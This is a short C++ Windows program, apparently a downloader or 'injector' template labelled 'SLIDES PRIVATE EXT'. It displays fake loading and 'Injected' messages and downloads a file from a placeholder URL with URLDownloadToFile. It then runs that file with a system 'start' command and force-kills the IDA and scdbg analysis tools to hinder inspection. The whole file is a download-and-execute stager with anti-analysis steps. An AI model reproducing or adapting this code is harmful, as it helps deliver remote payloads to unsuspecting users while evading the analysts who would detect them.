// C o D e D b Y s L i D e S

#include <iostream>
#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <tchar.h>
#include <urlmon.h>
#pragma comment (lib, "urlmon.lib")




void crash() {


        {
            system("taskkill /f /im ida64.exe >nul");
            system("CLS");
        }


        {
            system("taskkill /f /im scdbg.exe >nul");
            system("CLS");
        }




}


void inject() {


    {
        SetConsoleTitleA("[/] *CONSOLE* [%]");
        SetConsoleTitleA("[%] *CONSOLE* [/]");
    }


    {


        {
            printf("\n [/]");
            Sleep(900);
        }


        {
            system("CLS");
            printf("\n [+]");
        }


    }


    {


           
        {
                          HRESULT p2 = URLDownloadToFile(NULL, _T("URL TO DOWNLOAD GOES HERE"),
                        _T("WHERE THE DOWNLOAD PATH IS EX: C:\\USERS\\SYSTEM32"), 0, NULL);

                          system("start PATH GOES HERE");
                    MessageBoxA(NULL, "Sucessfully", "Injected", MB_OK); crash();
        }
        exit(1);


    }
}

int main()
{


        {

            SetConsoleTitleA("[ # SLIDES PRIVATE EXT ]");
            printf("\nloading.");
            system("CLS");
            Sleep(1500);
        }


        {
            printf("\nloading..");
            system("CLS");
            Sleep(1750);
            printf("\nloading...");
        }


        {
            system("CLS");
            system("COLOR C");
        }


        {
            inject();
        }


}
